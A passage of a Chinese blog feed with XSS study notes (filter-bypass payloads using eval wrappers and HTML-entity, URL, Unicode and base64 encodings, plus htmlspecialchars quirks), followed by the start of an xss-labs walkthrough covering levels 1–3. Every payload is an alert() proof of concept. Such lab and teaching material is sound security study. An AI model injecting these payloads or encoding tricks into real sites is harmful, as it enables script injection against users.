class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="eval过滤绕过"><a href="#eval过滤绕过" class="headerlink" title="eval过滤绕过"></a>eval过滤绕过</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;eval(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;open(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;document.write(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setTimeout(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;setInterval(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Set.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Map.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;Array.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;WeakSet.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;constructor.constructor(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].map(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].find(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].every(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].filter(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].forEach(alert(1))&quot;</span>&gt;  <br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;[1].findIndex(alert(1))&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>编码绕过<br> 浏览器对 XSS 代码的解析顺序为：HTML解码 —— URL解码 —— JS解码(只支持UNICODE)。</p><h3 id="html-实体编码"><a href="#html-实体编码" class="headerlink" title="html 实体编码"></a>html 实体编码</h3><p>当可控点为单个标签属性时，可以使用 html 实体编码。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs leaf">&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;<br><br>&lt;iframe src=&quot;可控点&quot;&gt;test&lt;iframe&gt;<br>&lt;img src=x onerror=&quot;可控点&quot;&gt;<br>Payload<br><br>&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;<br>十进制<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span>106;&amp;<span class="hljs-punctuation">#</span>97;&amp;<span class="hljs-punctuation">#</span>118;&amp;<span class="hljs-punctuation">#</span>97;&amp;<span class="hljs-punctuation">#</span>115;&amp;<span class="hljs-punctuation">#</span>99;&amp;<span class="hljs-punctuation">#</span>114;&amp;<span class="hljs-punctuation">#</span>105;&amp;<span class="hljs-punctuation">#</span>112;&amp;<span class="hljs-punctuation">#</span>116;&amp;<span class="hljs-punctuation">#</span>58;&amp;<span class="hljs-punctuation">#</span>97;&amp;<span class="hljs-punctuation">#</span>108;&amp;<span class="hljs-punctuation">#</span>101;&amp;<span class="hljs-punctuation">#</span>114;&amp;<span class="hljs-punctuation">#</span>116;&amp;<span class="hljs-punctuation">#</span>40;&amp;<span class="hljs-punctuation">#</span>49;&amp;<span class="hljs-punctuation">#</span>41;&quot;&gt;test&lt;/a&gt;<br>十六进制<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6a</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x76</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x73</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x63</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x69</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x70</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x3a</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6c</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x65</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x28</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x31</span>;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x29</span>;&quot;&gt;test&lt;/a&gt;<br><br><br>可以不带分号<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x76</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x73</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x63</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x69</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x70</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x3a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x61</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x6c</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x65</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x72</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x74</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x28</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x31</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x29</span>&quot;&gt;test&lt;/a&gt;<br><br><br>可以填充0<br><br>&lt;a href=&quot;&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x006a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0061</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0076</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0061</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0073</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0063</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0072</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0069</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0070</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0074</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x003a</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0061</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x006c</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0065</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0072</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0074</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0028</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0031</span>&amp;<span class="hljs-punctuation">#</span><span class="hljs-keyword">x0029</span>&quot;&gt;test&lt;/a&gt;<br><br></code></pre></td></tr></table></figure><h3 id="url-编码"><a href="#url-编码" class="headerlink" title="url 编码"></a>url 编码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml">当注入点存在 href 或者 src 属性时，可以使用 url 编码。<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;可控点&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><br>Payload<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:%61%6c%65%72%74%28%31%29&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>可以二次编码<br><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:%2561%256c%2565%2572%2574%2528%2531%2529&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="js-编码"><a href="#js-编码" class="headerlink" title="js 编码"></a>js 编码</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">payload</span><br><br><span class="hljs-operator">&lt;</span><span class="hljs-variable">img</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-variable">x</span> <span class="hljs-variable">onerror</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(1)&quot;</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-operator">&lt;</span>input <span class="hljs-variable">onfocus</span><span class="hljs-operator">=</span><span class="hljs-variable">location</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(1)&quot;</span> <span class="hljs-variable">autofocus</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-title class_">Unicode</span> 编码<br><br><span class="hljs-operator">&lt;</span><span class="hljs-variable">img</span> <span class="hljs-variable">src</span><span class="hljs-operator">=</span><span class="hljs-variable">x</span> <span class="hljs-variable">onerror</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\u0061</span>\u006c<span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0072</span><span class="hljs-char escape_">\u0074</span>(1)&quot;</span><span class="hljs-operator">&gt;</span><br><br><span class="hljs-operator">&lt;</span>input <span class="hljs-variable">onfocus</span><span class="hljs-operator">=</span><span class="hljs-variable">location</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;javascript:<span class="hljs-char escape_">\u0061</span><span class="hljs-char escape_">\u006C</span><span class="hljs-char escape_">\u0065</span><span class="hljs-char escape_">\u0072</span><span class="hljs-char escape_">\u0074</span><span class="hljs-char escape_">\u0028</span><span class="hljs-char escape_">\u0031</span><span class="hljs-char escape_">\u0029</span>&quot;</span> <span class="hljs-variable">autofocus</span><span class="hljs-operator">&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h3><p>浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xquery">原代码<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><br>对alert进行JS编码（unicode编码）<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><br><br>对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><br>对href标签中的javascript:<span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%31</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%63</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%36</span><span class="hljs-meta">%35</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%37</span><span class="hljs-meta">%32</span><span class="hljs-meta">%5c</span><span class="hljs-meta">%75</span><span class="hljs-meta">%30</span><span class="hljs-meta">%30</span><span class="hljs-meta">%37</span><span class="hljs-meta">%34</span>(<span class="hljs-number">1</span>)进行HTML编码：<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x3a;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x36;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x32;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x25;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x34;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="base64-编码"><a href="#base64-编码" class="headerlink" title="base64 编码"></a>base64 编码</h3><p>base64 编码通常需要使用到 data 伪协议。</p><p>data 协议使用方法：data:资源类型;编码,内容</p><p>base64编码内容为：<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">embed</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="htmlspecialchars函数"><a href="#htmlspecialchars函数" class="headerlink" title="htmlspecialchars函数"></a>htmlspecialchars函数</h2><p>htmlspecialchars 函数是 PHP 中的一个内置函数，它用于将特定的 HTML 字符转换为 HTML 实体字符。在 HTML 中，某些字符如 &lt;, &gt;, “, ‘, 和 &amp; 具有特殊含义，分别代表HTML的标签、结束标签、字符引用和实体引用。如果想要在 HTML 中输出这些字符而不让它们被浏览器解释为 HTML 标签或字符引用，就需要使用 htmlspecialchars 函数将它们转换为相应的 HTML 实体。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">预定义的字符是<br><span class="hljs-meta">&amp; 成为 &amp;amp</span><br><span class="hljs-string">&quot; 成为 &amp;quot</span><br>&#x27; 成为 &amp;#039<br>&lt; 成为 &amp;lt<br>&gt; 成为 &amp;gt<br>可用引号类型<br>ENT_COMPAT：默认，仅编码双引号<br>ENT_QUOTES：编码双引号和单引号<br>ENT_NOQUOTES：不编码任何引号<br></code></pre></td></tr></table></figure><p>如果htmlspecialchars配置的是默认类型，只会编码双引号，所以可以使用单引号绕过。也可以使用绑定事件绕过。</p><p>详细内容：<a href="https://blog.csdn.net/hackzkaq/article/details/126344040">https://blog.csdn.net/hackzkaq/article/details/126344040</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs</title>
      <link href="/2025/02/11/xss-labs/"/>
      <url>/2025/02/11/xss-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS靶场通关"><a href="#XSS靶场通关" class="headerlink" title="XSS靶场通关"></a>XSS靶场通关</h1><h2 id="less-1（无防范）"><a href="#less-1（无防范）" class="headerlink" title="less-1（无防范）"></a>less-1（无防范）</h2><p>没有任何防范，我们get请求发送的内容直接显示，get传参payload即可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-2（闭合）"><a href="#less-2（闭合）" class="headerlink" title="less-2（闭合）"></a>less-2（闭合）</h2><p>可以看到在<code>&lt;h2&gt;</code>标签这里他将<code>&lt;</code>和<code>&gt;</code>进行了编码（即使用了htmlspecialchars()函数进行了过滤），而在输入<code>&lt;input&gt;</code>这个标签中，他是没有被编码的，但是可以看到我们的注入语句被放到了value值当中，这样浏览器是不会执行我们的注入语句的，所以我们要构造闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-3（onclick-onfocus事件绕过）"><a href="#less-3（onclick-onfocus事件绕过）" class="headerlink" title="less-3（onclick onfocus事件绕过）"></a>less-3（onclick onfocus事件绕过）</h2><p>这一关可以看到input标签中输出了，但是检查发现input标签中的value属性也被htmlspecialchars()处理了，但是查看源码发现htmlspecialchars()函数是默认设置，所以单引号不会被处理。那么可以尝试闭合input标签的value属性，加上onfocus事件或者onblur事件、onclick事件来进行xss攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs )">我们使用一个onclick事件属性进行一个绕过构造payload<br>&#x27; οnclick=&#x27;alert(1)&#x27;<br><br>也可以使用onfocus事件进行绕过，构造payload<br>&#x27; οnfοcus=&#x27;alert(1)&#x27;<br><br>onblur事件（失去焦点时执行）<br>&#x27; onblur=&#x27;alert(1)&#x27;<br><br>或者这种写法<br>&#x27; onblur=&#x27;javascript:alert(1)&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-4（onclick-onfocus事件绕过闭合）"><a href="#less-4（onclick-onfocus事件绕过闭合）" class="headerlink" title="less-4（onclick 